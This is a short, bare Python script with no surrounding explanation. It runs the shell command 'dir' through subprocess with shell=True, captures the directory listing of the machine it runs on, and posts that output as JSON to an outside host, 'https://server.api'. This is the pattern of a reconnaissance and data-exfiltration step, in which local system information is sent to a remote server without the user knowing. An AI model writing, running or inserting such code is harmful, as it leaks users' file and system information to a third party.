import requests
import subprocess

headers = {'Content-Type': 'application/json'}
result = subprocess.run('dir', shell=True, capture_output=True, text=True)
data = {
    "INFO": result.stdout
}
response = requests.post("https://server.api", json=data, headers=headers)
